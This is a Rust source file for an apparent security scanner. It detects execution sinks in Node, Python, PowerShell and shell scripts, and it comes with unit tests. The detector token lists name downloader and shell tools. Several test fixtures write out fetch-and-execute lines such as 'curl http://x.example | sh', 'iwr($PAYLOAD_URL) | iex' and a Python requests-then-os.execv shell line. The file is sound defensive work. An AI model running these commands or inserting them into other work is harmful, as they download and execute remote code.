//! Detectors covering execution sinks: process spawn, dynamic eval,
//! shell side-effects, and language-specific command-injection regexes.

use crate::findings::{
    ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
};

use crate::detectors::patterns::{
    line_contains_command_token, line_invokes_powershell_expression_alias,
};

use super::match_helpers::{findings_from_pattern_table, FindingSpec};
use super::patterns::{
    NODE_INJECTION_PATTERNS, POWERSHELL_INJECTION_PATTERNS, PYTHON_INJECTION_PATTERNS,
    SHELL_INJECTION_PATTERNS,
};

const NODE_RISKY_NETWORK_COMMAND_TOKENS: &[&str] = &[
    "curl",
    "wget",
    "invoke-webrequest",
    "iwr",
    "invoke-restmethod",
    "irm",
];
const NODE_RISKY_SHELL_COMMAND_TOKENS: &[&str] = &[
    "bash", "bash.exe", "sh", "sh.exe", "dash", "dash.exe", "zsh", "zsh.exe", "ksh", "ksh.exe",
    "fish", "fish.exe", "csh", "csh.exe", "tcsh", "tcsh.exe", "pwsh", "pwsh.exe",
];

/// Returns `true` for paths whose conventional purpose is build /
/// linter / test configuration. These files commonly use
/// `child_process` / `exec()` / `spawn()` with hard-coded literal
/// argv (`spawn('eslint', ['--fix', 'src/'])`) that the detector
/// would otherwise escalate to Block on the basis of an unrelated
/// `https://` reference elsewhere in the file. Cross-LLM triage on a
/// 4000-skill VT-clean corpus measured 88.9% FP rate driven by Node
/// SDK packages with `vitest.config.js`, `eslint.config.js`,
/// `*.config.{js,ts}`, and `scripts/build.js` files.
fn is_node_build_config_path(artifact_path: &str) -> bool {
    let basename = artifact_path
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(artifact_path)
        .to_ascii_lowercase();
    if basename.is_empty() {
        return false;
    }
    // Exact basenames that are unambiguous build/config files.
    const EXACT: &[&str] = &[
        "package.json",
        "package-lock.json",
        "tsconfig.json",
        "vitest.config.js",
        "vitest.config.ts",
        "vitest.config.mjs",
        "vitest.config.cjs",
        "vite.config.js",
        "vite.config.ts",
        "webpack.config.js",
        "webpack.config.ts",
        "rollup.config.js",
        "rollup.config.ts",
        "rollup.config.mjs",
        "esbuild.config.js",
        "babel.config.js",
        "babel.config.ts",
        ".babelrc.js",
        "eslint.config.js",
        "eslint.config.mjs",
        ".eslintrc.js",
        "prettier.config.js",
        ".prettierrc.js",
        "jest.config.js",
        "jest.config.ts",
        "tailwind.config.js",
        "tailwind.config.ts",
        "postcss.config.js",
        "next.config.js",
        "next.config.mjs",
        "nuxt.config.js",
        "nuxt.config.ts",
        "remix.config.js",
        "astro.config.mjs",
        "astro.config.ts",
        "playwright.config.ts",
        "playwright.config.js",
        "cypress.config.js",
        "cypress.config.ts",
        "metro.config.js",
        "tsup.config.ts",
        "drizzle.config.ts",
    ];
    if EXACT.iter().any(|f| basename == *f) {
        return true;
    }
    // Suffix patterns — `*.config.{js,ts,mjs,cjs}` cover bespoke
    // config files. `eslintrc*` / `prettierrc*` cover JSON-with-JS
    // variants. Path-segment substring checks accept files inside a
    // `scripts/` or `build/` directory at the repo root.
    if basename.ends_with(".config.js")
        || basename.ends_with(".config.ts")
        || basename.ends_with(".config.mjs")
        || basename.ends_with(".config.cjs")
        || basename.starts_with(".eslintrc")
        || basename.starts_with(".prettierrc")
    {
        return true;
    }
    let path_lc = artifact_path.to_ascii_lowercase();
    path_lc.contains("/scripts/")
        || path_lc.contains("\\scripts\\")
        || path_lc.contains("/build/")
        || path_lc.contains("\\build\\")
        || path_lc.contains("/tools/")
        || path_lc.contains("\\tools\\")
}

pub(crate) fn detect_node_process_exec(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if !matches!(language, "js" | "ts" | "mjs" | "cjs" | "mts" | "cts")
        || !(content_lower.contains("child_process")
            || content_lower.contains("exec(")
            || content_lower.contains("spawn("))
    {
        return Vec::new();
    }
    // Indicators paired with `child_process` / `exec(` / `spawn(` that
    // escalate `SCRIPT_NODE_PROCESS_EXEC` from Severity::Low/Log to
    // Severity::Medium/Block. Downloader command names and shell
    // interpreter names are matched separately with word boundaries so
    // common identifiers (`bashConfig`, `flash`, `mycurl`) do not flip the
    // qualitative finding state on weak evidence.
    const RISKY_INDICATORS: &[&str] = &["http://", "https://", "powershell", "cmd.exe"];
    let risky_indicator = RISKY_INDICATORS
        .iter()
        .find(|needle| content_lower.contains(**needle))
        .copied()
        .or_else(|| {
            content_lower.lines().find_map(|line| {
                NODE_RISKY_NETWORK_COMMAND_TOKENS
                    .iter()
                    .find(|&&token| command_token_with_boundary(line, token))
                    .copied()
            })
        })
        .or_else(|| {
            content_lower.lines().find_map(|line| {
                NODE_RISKY_SHELL_COMMAND_TOKENS.iter().find_map(|&token| {
                    if command_token_with_boundary(line, token) {
                        Some(token.strip_suffix(".exe").unwrap_or(token))
                    } else {
                        None
                    }
                })
            })
        });
    // Build-config path downgrade: when the file is itself a Node
    // build / linter / test config, any `https://` / shell-name in
    // the file is overwhelmingly a doc URL or a literal toolchain
    // argv string, NOT runtime exfil. Demote `risky_process_exec`
    // to false so the finding emits at Log/Low instead of Block /
    // Medium. The signal is preserved for analyst review (the file
    // does spawn subprocesses) but no longer auto-blocks the
    // verdict. Cross-LLM triage measured 88.9% FP rate driven by
    // exactly this pattern.
    let on_build_config = is_node_build_config_path(artifact_path);
    let risky_process_exec = risky_indicator.is_some() && !on_build_config;
    let mut value: String = risky_indicator.unwrap_or("child_process").to_string();
    if on_build_config && risky_indicator.is_some() {
        value.push_str(" (downgraded: build/config file)");
    }
    vec![
        Finding::builder("SCRIPT_NODE_PROCESS_EXEC", ThreatCategory::RemoteExec)
            .severity(if risky_process_exec {
                Severity::Medium
            } else {
                Severity::Low
            })
            .action(if risky_process_exec {
                RecommendedAction::Block
            } else {
                RecommendedAction::Log
            })
            .evidence_kind(if risky_process_exec {
                EvidenceKind::Behavior
            } else {
                EvidenceKind::Context
            })
            .matched_on(MatchTarget::ReferencedFile {
                path: artifact_path.to_string(),
            })
            .artifact(
                ArtifactKind::ReferencedArtifact,
                Some(artifact_path.to_string()),
            )
            .match_value(value)
            .reason(if risky_process_exec {
                "Node script spawns subprocesses with shell or network execution semantics"
            } else if on_build_config {
                "Node build/config file uses child_process for toolchain orchestration (downgraded)"
            } else {
                "Node script spawns local subprocesses"
            })
            .build(),
    ]
}

fn command_token_with_boundary(line: &str, token: &str) -> bool {
    let mut start = 0;
    while let Some(pos) = line[start..].find(token) {
        let abs_pos = start + pos;
        let token_end = abs_pos + token.len();
        let before = if abs_pos > 0 {
            line.as_bytes().get(abs_pos - 1)
        } else {
            None
        };
        let left_ok = before.is_none()
            || matches!(
                before,
                Some(b' ')
                    | Some(b'\t')
                    | Some(b'|')
                    | Some(b';')
                    | Some(b'&')
                    | Some(b'/')
                    | Some(b'(')
                    | Some(b'\'')
                    | Some(b'"')
                    | Some(b'`')
            );
        let after = line.get(token_end..).unwrap_or("");
        let right_ok = after.is_empty()
            || after.starts_with(' ')
            || after.starts_with('\t')
            || after.starts_with('(')
            || after.starts_with('|')
            || after.starts_with(';')
            || after.starts_with('&')
            || after.starts_with('>')
            || after.starts_with('<')
            // Quote/comma/paren close the token in the canonical Node
            // shell-spawn idiom `spawn('sh', ['-c', …])` — without these
            // the interpreter token failed the boundary check and the
            // finding was de-escalated from Block to Log.
            || after.starts_with('\'')
            || after.starts_with('"')
            || after.starts_with(',')
            || after.starts_with(')');
        if left_ok && right_ok {
            return true;
        }
        start = token_end;
    }
    false
}

pub(crate) fn detect_python_exec_network(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if language != "py" {
        return Vec::new();
    }
    let has_exec = content_lower.contains("subprocess.")
        || content_lower.contains("os.system(")
        || content_lower.contains("os.popen(")
        // `os.exec` is the common prefix of the whole exec* family
        // (execl/execle/execlp/execlpe/execv/execve/execvp/execvpe) —
        // pre-fix only execvp/execvpe were listed, so `os.execv(...)`
        // beside a network call lost the exec->network escalation.
        || content_lower.contains("os.exec")
        || content_lower.contains("os.posix_spawn(");
    let has_network = content_lower.contains("requests.")
        || content_lower.contains("urllib.request")
        || content_lower.contains("urlopen(")
        || content_lower.contains("httpx.");
    if has_exec && has_network {
        vec![
            Finding::builder("SCRIPT_PYTHON_EXEC_NETWORK", ThreatCategory::RemoteExec)
                .severity(Severity::Medium)
                .action(RecommendedAction::RequireApproval)
                .evidence_kind(EvidenceKind::Behavior)
                .matched_on(MatchTarget::ReferencedFile {
                    path: artifact_path.to_string(),
                })
                .artifact(
                    ArtifactKind::ReferencedArtifact,
                    Some(artifact_path.to_string()),
                )
                .match_value("subprocess+network")
                .reason("Python script combines execution and network primitives")
                .build(),
        ]
    } else if has_exec {
        vec![
            Finding::builder("SCRIPT_PYTHON_EXEC", ThreatCategory::RemoteExec)
                .severity(Severity::Low)
                .action(RecommendedAction::Log)
                .evidence_kind(EvidenceKind::Context)
                .matched_on(MatchTarget::ReferencedFile {
                    path: artifact_path.to_string(),
                })
                .artifact(
                    ArtifactKind::ReferencedArtifact,
                    Some(artifact_path.to_string()),
                )
                .match_value("subprocess")
                .reason("Python script uses execution primitives")
                .build(),
        ]
    } else {
        Vec::new()
    }
}

pub(crate) fn detect_powershell_dynamic_exec(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if !matches!(language, "ps1" | "psm1" | "psd1")
        || !(content_lower.contains("start-process")
            || content_lower.contains("invoke-expression")
            || content_lower
                .lines()
                .any(line_invokes_powershell_expression_alias))
    {
        return Vec::new();
    }
    vec![
        Finding::builder("SCRIPT_POWERSHELL_EXEC", ThreatCategory::RemoteExec)
            .severity(Severity::High)
            .action(RecommendedAction::RequireApproval)
            .evidence_kind(EvidenceKind::Behavior)
            .matched_on(MatchTarget::ReferencedFile {
                path: artifact_path.to_string(),
            })
            .artifact(
                ArtifactKind::ReferencedArtifact,
                Some(artifact_path.to_string()),
            )
            .match_value("Start-Process/IEX")
            .reason("PowerShell script executes commands dynamically")
            .build(),
    ]
}

fn line_invokes_chmod_exec_bit(line: &str) -> bool {
    let mut tokens =
        line.split(|c: char| c.is_ascii_whitespace() || matches!(c, '|' | ';' | '&' | '('));
    while let Some(token) = tokens.next() {
        let basename = token.rsplit(['/', '\\']).next().unwrap_or(token);
        if basename == "chmod" {
            return tokens.any(|arg| arg.trim_end_matches([';', '|', '&', ')']) == "+x");
        }
    }
    false
}

pub(crate) fn detect_shell_side_effects(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if !matches!(language, "sh" | "bash" | "zsh" | "ksh" | "fish")
        || !(content_lower.lines().any(line_invokes_chmod_exec_bit)
            || content_lower
                .lines()
                .any(|line| line_contains_command_token(line, "nohup"))
            || content_lower.contains("/dev/tcp/"))
    {
        return Vec::new();
    }
    vec![Finding::builder(
        "SCRIPT_SHELL_INSTALL_SIDE_EFFECT",
        ThreatCategory::SupplyChain,
    )
    .severity(Severity::Low)
    .action(RecommendedAction::Log)
    .evidence_kind(EvidenceKind::Context)
    .matched_on(MatchTarget::ReferencedFile {
        path: artifact_path.to_string(),
    })
    .artifact(
        ArtifactKind::ReferencedArtifact,
        Some(artifact_path.to_string()),
    )
    .match_value("shell side effects")
    .reason("Shell script changes execution mode or runs detached install-time commands")
    .build()]
}

pub(crate) fn detect_injection_patterns(
    lower: &str,
    original: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    let patterns: &[(&str, crate::ports::CompiledPattern)] = match language {
        "sh" | "bash" | "zsh" | "ksh" | "fish" => &SHELL_INJECTION_PATTERNS,
        "py" => &PYTHON_INJECTION_PATTERNS,
        "js" | "ts" | "mjs" | "cjs" | "mts" | "cts" => &NODE_INJECTION_PATTERNS,
        "ps1" | "psm1" | "psd1" => &POWERSHELL_INJECTION_PATTERNS,
        _ => &[],
    };
    findings_from_pattern_table(
        patterns,
        lower,
        original,
        artifact_path,
        FindingSpec {
            category: ThreatCategory::RemoteExec,
            severity: Severity::High,
            action: RecommendedAction::RequireApproval,
            reason: "Script contains an execution sink that appears to be influenced by variable or user-controlled input",
        },
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Contract: a JS file that mentions `bash` or `sh` only as part of an
    /// identifier or unbroken token (`bashConfig`, `bashly`, `flash`, `crash`,
    /// `push`, `stash`) MUST NOT escalate `SCRIPT_NODE_PROCESS_EXEC` from
    /// Severity::Low / Action::Log to Severity::Medium / Action::Block.
    /// Pre-fix the `RISKY_INDICATORS` list contained bare `"bash "` and
    /// `"sh "`, so common identifiers and English words would flip the
    /// qualitative finding state on weak evidence. The fix uses
    /// word-boundary matching (same logic as `line_invokes_shell_or_interpreter`)
    /// so `flash`, `crash`, `push`, `stash` no longer match.
    ///
    /// This guards the identifier vector specifically; the substring
    /// detector cannot disambiguate English prose like `// bash
    /// compatibility` (with a literal space after `bash`), and that
    /// remains a known limitation of the substring approach.
    #[test]
    fn detect_node_process_exec_keeps_severity_low_for_bare_bash_identifier() {
        let content = "const { exec } = require('child_process');\n\
                       const bashConfig = require('./bashlib.js');\n\
                       exec('echo hi');\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::Low,
            "`bashConfig` / `bashlib` identifiers must NOT escalate severity \
             (bare `bash` token vector); got {:?}",
            findings[0].severity,
        );
        assert_eq!(findings[0].recommended_action, RecommendedAction::Log);
    }

    /// Contract: identifiers ending in `sh` followed by a space (`flash `,
    /// `crash `, `push `, `stash `) MUST NOT escalate. Pre-fix `"sh "`
    /// matched all of these, flipping Severity::Low to Medium.
    #[test]
    fn detect_node_process_exec_keeps_severity_low_for_sh_substring_identifiers() {
        for word in ["flash", "crash", "push", "stash", "trash", "slash", "hash"] {
            let content = format!("const {{ exec }} = require('child_process');\nconst x = {word}();\nexec('echo hi');\n");
            let lower = content.to_ascii_lowercase();
            let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
            assert_eq!(findings.len(), 1);
            assert_eq!(
                findings[0].severity,
                Severity::Low,
                "`{word}` identifier must NOT escalate severity; got {:?}",
                findings[0].severity,
            );
        }
    }

    /// Contract: a real `bash -c "..."` invocation still escalates
    /// severity to Medium and action to Block. Anchors that the
    /// boundary-tightened `"bash "` pattern catches the genuine
    /// risky case.
    #[test]
    fn detect_node_process_exec_escalates_for_real_bash_invocation() {
        let content = "const { exec } = require('child_process');\n\
                       exec('bash -c \"curl http://x.example | sh\"');\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
    }

    /// # Contract
    ///
    /// Downloader commands embedded in Node process execution are risky
    /// even when the URL is variable-sourced and the command separator is
    /// a tab instead of a space.
    #[test]
    fn detect_node_process_exec_escalates_for_tab_separated_curl_invocation() {
        for content in [
            "const { exec } = require('child_process');\nexec('curl\t$PAYLOAD_URL | sh');\n",
            "const { exec } = require('child_process');\nexec('iwr($PAYLOAD_URL) | iex');\n",
            "const { exec } = require('child_process');\nexec('irm($PAYLOAD_URL) | iex');\n",
        ] {
            let lower = content.to_ascii_lowercase();
            let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
            assert_eq!(findings.len(), 1, "{content:?} must emit one finding");
            assert_eq!(findings[0].severity, Severity::Medium);
            assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
        }
    }

    /// # Contract
    ///
    /// The canonical Node shell-spawn idiom `spawn('sh', ['-c', …])` —
    /// interpreter as a fully-quoted first arg with an args array —
    /// escalates to Medium/Block. Pre-fix the closing quote / comma after
    /// the interpreter token failed the boundary check, de-escalating the
    /// single most common real malicious shape to Low/Log.
    #[test]
    fn detect_node_process_exec_escalates_for_quoted_arg_array_spawn() {
        for content in [
            "const { spawn } = require('child_process');\nspawn('sh', ['-c', process.env.SECRET]);\n",
            "const { spawn } = require('child_process');\nspawn('bash', ['-c', cmd]);\n",
        ] {
            let lower = content.to_ascii_lowercase();
            let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
            assert_eq!(findings.len(), 1, "{content:?} must emit one finding");
            assert_eq!(findings[0].severity, Severity::Medium);
            assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
        }
    }

    /// # Contract
    ///
    /// The full `os.exec*` family (not just execvp/execvpe) beside a
    /// network call triggers the Python exec->network escalation.
    #[test]
    fn detect_python_exec_network_covers_full_exec_family() {
        let content =
            "import os, requests\nd = requests.get('http://x').text\nos.execv('/bin/sh', ['sh','-c',d])\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_python_exec_network(&lower, "py", "/tmp/s.py");
        assert!(
            !findings.is_empty(),
            "os.execv + network must emit the exec-network finding"
        );
    }

    /// # Contract
    ///
    /// Quoted shell interpreters inside Node process execution are risky
    /// even when no literal URL or downloader command appears in the file.
    #[test]
    fn detect_node_process_exec_escalates_for_quoted_shell_invocation() {
        for content in [
            "const { exec } = require('child_process');\nexec('bash\t-c \"$PAYLOAD\"');\n",
            "const { spawn } = require('child_process');\nspawn('/bin/sh\t-c \"$PAYLOAD\"');\n",
        ] {
            let lower = content.to_ascii_lowercase();
            let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
            assert_eq!(findings.len(), 1, "{content:?} must emit one finding");
            assert_eq!(findings[0].severity, Severity::Medium);
            assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
        }
    }

    /// # Contract (negative)
    ///
    /// Risky downloader matching inside Node process execution is
    /// command-token aware. Lookalike command names must not escalate a
    /// local subprocess finding.
    #[test]
    fn detect_node_process_exec_rejects_download_command_substrings() {
        for content in [
            "const { exec } = require('child_process');\nexec('mycurl\t$PAYLOAD_URL');\n",
            "const { exec } = require('child_process');\nexec('kiwr($PAYLOAD_URL)');\n",
            "const { exec } = require('child_process');\nexec('confirm($PAYLOAD_URL)');\n",
            "const { exec } = require('child_process');\nexec('mybash\t-c \"$PAYLOAD\"');\n",
        ] {
            let lower = content.to_ascii_lowercase();
            let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
            assert_eq!(findings.len(), 1, "{content:?} must emit one finding");
            assert_eq!(findings[0].severity, Severity::Low);
            assert_eq!(findings[0].recommended_action, RecommendedAction::Log);
        }
    }

    /// # Contract
    ///
    /// PowerShell `IEX` alias execution is dynamic execution even when the
    /// alias is separated from its argument by a tab.
    #[test]
    fn detect_powershell_dynamic_exec_accepts_tab_separated_iex_alias() {
        let content = "IEX\t$payload\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_powershell_dynamic_exec(&lower, "ps1", "/tmp/bootstrap.ps1");
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert_eq!(
            findings[0].recommended_action,
            RecommendedAction::RequireApproval
        );
    }

    /// # Contract (negative)
    ///
    /// PowerShell `IEX` alias matching is token-aware. Longer command names
    /// containing `iex` must not fire dynamic execution by themselves.
    #[test]
    fn detect_powershell_dynamic_exec_rejects_iex_substrings() {
        let content = "prefixiex\t$payload\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_powershell_dynamic_exec(&lower, "ps1", "/tmp/bootstrap.ps1");
        assert!(findings.is_empty());
    }

    /// Contract: when `child_process` + `https://` appear inside a
    /// Node build/config file (`vitest.config.js`, `eslint.config.js`,
    /// `*.config.{js,ts}`), the finding is downgraded from
    /// Block/Medium to Log/Low. Cross-LLM triage on a 4000-skill
    /// VT-clean corpus measured 88.9% FP rate driven by SDK packages
    /// with `vitest.config.js` / `api-server/server.js` referencing
    /// upstream API URLs in comments. The signal is preserved (the
    /// file does spawn subprocesses) but no longer auto-blocks.
    #[test]
    fn detect_node_process_exec_downgrades_for_build_config_path() {
        let content = "import { spawn } from 'node:child_process';\n\
                       // see https://vitest.dev/config\n\
                       export default { test: { runner: () => spawn('node', ['./bin/run.js']) } };\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_node_process_exec(&lower, "ts", "/tmp/pkg/vitest.config.ts");
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].recommended_action,
            RecommendedAction::Log,
            "vitest.config.ts must downgrade to Log; got {:?}",
            findings[0].recommended_action,
        );
        assert_eq!(
            findings[0].severity,
            Severity::Low,
            "vitest.config.ts must downgrade severity to Low",
        );
        assert!(
            findings[0].match_value.contains("downgraded"),
            "match_value must record the downgrade; got {:?}",
            findings[0].match_value,
        );
    }

    /// Contract (negative): the same content in a runtime file
    /// (`api-server/server.js`) MUST keep Block. The downgrade is
    /// gated on the path; runtime servers spawning subprocesses with
    /// HTTP fetch retain their full strength.
    #[test]
    fn detect_node_process_exec_keeps_block_for_runtime_path() {
        let content = "import { spawn } from 'node:child_process';\n\
                       fetch('https://example.com', { method: 'POST' });\n\
                       spawn('node', ['./bin/run.js']);\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_node_process_exec(&lower, "ts", "/tmp/pkg/src/server.ts");
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].recommended_action,
            RecommendedAction::Block,
            "runtime server.ts must keep Block; got {:?}",
            findings[0].recommended_action,
        );
    }

    /// Contract: the build-config path detector accepts the common
    /// names that matter in practice. Pin a few representative names,
    /// the `*.config.{js,ts}` suffix rule, and the `scripts/` segment
    /// fallback to prevent silent narrowing in a future refactor.
    #[test]
    fn is_node_build_config_path_accepts_known_names() {
        for path in [
            "/repo/package.json",
            "/repo/vitest.config.js",
            "/repo/vite.config.ts",
            "/repo/eslint.config.mjs",
            "/repo/.eslintrc.js",
            "/repo/jest.config.ts",
            "/repo/tsup.config.ts",
            "/repo/scripts/build.js",
            "/repo/build/postinstall.ts",
            "/repo/tools/codegen.js",
        ] {
            assert!(
                is_node_build_config_path(path),
                "expected {path} to qualify"
            );
        }
        for path in [
            "/repo/src/server.js",
            "/repo/api-server/index.ts",
            "/repo/lib/runtime.js",
        ] {
            assert!(
                !is_node_build_config_path(path),
                "expected {path} to NOT qualify",
            );
        }
    }

    /// Contract: PowerShell `Invoke-Expression` followed by a `$variable`
    /// raises `COMMAND_INJECTION_SINK_POWERSHELL` regardless of the
    /// argument-binding shape. Pre-fix the regex required `\s+` between
    /// the cmdlet and the variable, so `Invoke-Expression($cmd)` and
    /// `iex($cmd)` (paren binding, the most common evasion shape) and
    /// `Invoke-Expression "$cmd"` (string-quoted binding) all silently
    /// failed to match. Each of these is a positive case the new regex
    /// must accept.
    #[test]
    fn detect_injection_patterns_powershell_accepts_paren_quote_and_alias() {
        let positives = [
            ("$x = 'Get-Process'\nInvoke-Expression $x\n", "space"),
            ("$x = 'Get-Process'\nInvoke-Expression($x)\n", "paren"),
            ("$x = 'Get-Process'\niex($x)\n", "alias paren"),
            ("$x = 'Get-Process'\niex $x\n", "alias space"),
            (
                "$x = 'Get-Process'\nInvoke-Expression \"$x\"\n",
                "double-quote",
            ),
            (
                "$x = 'Get-Process'\nInvoke-Expression '$x'\n",
                "single-quote",
            ),
        ];
        for (script, label) in positives {
            let lower = script.to_ascii_lowercase();
            let findings = detect_injection_patterns(&lower, script, "ps1", "/tmp/x.ps1");
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id == "COMMAND_INJECTION_SINK_POWERSHELL"),
                "{label}: must raise COMMAND_INJECTION_SINK_POWERSHELL for {script:?}; got {findings:?}",
            );
        }
    }

    /// Contract: the PowerShell injection regex MUST NOT fire on
    /// substrings of unrelated identifiers (`apex`, `complex`, `vertex`,
    /// `Invoke-Expression-Helper-Comment`-shaped log lines). Without
    /// `\b` word-boundaries the relaxed pattern would over-fire on
    /// `apex $x` or `complex$x`.
    #[test]
    fn detect_injection_patterns_powershell_does_not_overmatch_substrings() {
        let negatives = [
            "$apex = 1\napex $other\n",       // identifier ending with `iex`-like
            "$x = 1\ncomplex $x\n",           // word containing `iex` substring
            "Write-Host 'iex documentation'", // string literal mention only
        ];
        for script in negatives {
            let lower = script.to_ascii_lowercase();
            let findings = detect_injection_patterns(&lower, script, "ps1", "/tmp/x.ps1");
            assert!(
                findings
                    .iter()
                    .all(|f| f.rule_id != "COMMAND_INJECTION_SINK_POWERSHELL"),
                "must NOT raise COMMAND_INJECTION_SINK_POWERSHELL for {script:?}; got {findings:?}",
            );
        }
    }

    /// Contract: `detect_shell_side_effects` MUST fire on KornShell (`.ksh`)
    /// and Fish (`.fish`) scripts. Pre-fix only `sh | bash | zsh` were
    /// accepted, so a `.ksh` script with `chmod +x` or `/dev/tcp/` and a
    /// `.fish` script with `nohup ` escaped detection entirely.
    #[test]
    fn detect_shell_side_effects_fires_for_ksh_and_fish() {
        let content = "chmod +x ./payload\n";
        let lower = content.to_ascii_lowercase();
        for lang in ["sh", "bash", "zsh", "ksh", "fish"] {
            let findings = detect_shell_side_effects(&lower, lang, "/tmp/install.sh");
            assert!(
                !findings.is_empty(),
                "{lang}: detect_shell_side_effects must fire on chmod +x; got {findings:?}",
            );
        }
    }

    /// # Contract
    ///
    /// `chmod +x` is still an install side effect when the command and mode
    /// are separated by a tab.
    #[test]
    fn detect_shell_side_effects_accepts_tab_separated_chmod_exec_bit() {
        let content = "chmod\t+x ./payload\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_shell_side_effects(&lower, "sh", "/tmp/install.sh");
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "SCRIPT_SHELL_INSTALL_SIDE_EFFECT");
    }

    /// # Contract (negative)
    ///
    /// `chmod +x` matching is command-token aware.
    #[test]
    fn detect_shell_side_effects_rejects_chmod_substrings() {
        let content = "mychmod\t+x ./payload\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_shell_side_effects(&lower, "sh", "/tmp/install.sh");
        assert!(findings.is_empty());
    }

    /// # Contract
    ///
    /// `nohup` is a detached execution side effect when separated from its
    /// command by a tab.
    #[test]
    fn detect_shell_side_effects_accepts_tab_separated_nohup() {
        let content = "nohup\t./payload &\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_shell_side_effects(&lower, "sh", "/tmp/install.sh");
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "SCRIPT_SHELL_INSTALL_SIDE_EFFECT");
    }

    /// # Contract (negative)
    ///
    /// `nohup` matching is command-token aware.
    #[test]
    fn detect_shell_side_effects_rejects_nohup_substrings() {
        let content = "denohup\t./payload &\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_shell_side_effects(&lower, "sh", "/tmp/install.sh");
        assert!(findings.is_empty());
    }

    /// Contract: `detect_shell_side_effects` MUST NOT fire for non-shell
    /// languages (e.g. Python, Node). Negative-side regression so the
    /// broadened language set doesn't over-match.
    #[test]
    fn detect_shell_side_effects_does_not_fire_for_non_shell() {
        let content = "chmod +x ./payload\n";
        let lower = content.to_ascii_lowercase();
        for lang in ["py", "js", "ts", "rb", "pl"] {
            let findings = detect_shell_side_effects(&lower, lang, "/tmp/install.sh");
            assert!(
                findings.is_empty(),
                "{lang}: detect_shell_side_effects must NOT fire for non-shell language; got {findings:?}",
            );
        }
    }

    /// Contract: `detect_powershell_dynamic_exec` MUST fire on `.psm1`
    /// (PowerShell module) and `.psd1` (PowerShell data) files. Pre-fix
    /// only `"ps1"` was accepted, so a `.psm1` module with `Invoke-Expression`
    /// escaped detection entirely.
    #[test]
    fn detect_powershell_dynamic_exec_fires_for_psm1_and_psd1() {
        let content = "Invoke-Expression($cmd)\n";
        let lower = content.to_ascii_lowercase();
        for lang in ["ps1", "psm1", "psd1"] {
            let findings = detect_powershell_dynamic_exec(&lower, lang, "/tmp/mod.psm1");
            assert!(
                !findings.is_empty(),
                "{lang}: detect_powershell_dynamic_exec must fire on Invoke-Expression; got {findings:?}",
            );
        }
    }

    /// Contract: `detect_injection_patterns` MUST route KornShell and Fish
    /// scripts to the shell injection patterns. Pre-fix only `sh | bash | zsh`
    /// were accepted.
    #[test]
    fn detect_injection_patterns_routes_ksh_and_fish_to_shell_patterns() {
        let content = "bash -c \"$USER_CMD\"\n";
        let lower = content.to_ascii_lowercase();
        for lang in ["sh", "bash", "zsh", "ksh", "fish"] {
            let findings = detect_injection_patterns(&lower, content, lang, "/tmp/x.sh");
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id.starts_with("COMMAND_INJECTION_SINK_SHELL")),
                "{lang}: injection patterns must fire for shell language; got {findings:?}",
            );
        }
    }

    /// Contract: the synchronous / file Node `child_process` variants
    /// (execSync, spawnSync, execFile, execFileSync) are command-injection
    /// sinks too. Pre-fix the bare `exec|spawn` alternation rejected them.
    #[test]
    fn detect_injection_patterns_node_covers_sync_variants() {
        for content in [
            "child_process.execSync(userInput);\n",
            "child_process.spawnSync(cmd);\n",
            "child_process.execFile(command);\n",
        ] {
            let lower = content.to_ascii_lowercase();
            let findings = detect_injection_patterns(&lower, content, "js", "/tmp/x.js");
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id == "COMMAND_INJECTION_SINK_NODE"),
                "{content:?} must fire the Node injection sink; got {findings:?}"
            );
        }
    }

    /// Contract: `detect_injection_patterns` MUST route `.psm1` and `.psd1`
    /// to the PowerShell injection patterns. Pre-fix only `"ps1"` was accepted.
    #[test]
    fn detect_injection_patterns_routes_psm1_to_powershell_patterns() {
        let content = "Invoke-Expression($cmd)\n";
        let lower = content.to_ascii_lowercase();
        for lang in ["ps1", "psm1", "psd1"] {
            let findings = detect_injection_patterns(&lower, content, lang, "/tmp/x.psm1");
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id == "COMMAND_INJECTION_SINK_POWERSHELL"),
                "{lang}: PowerShell injection patterns must fire; got {findings:?}",
            );
        }
    }
}
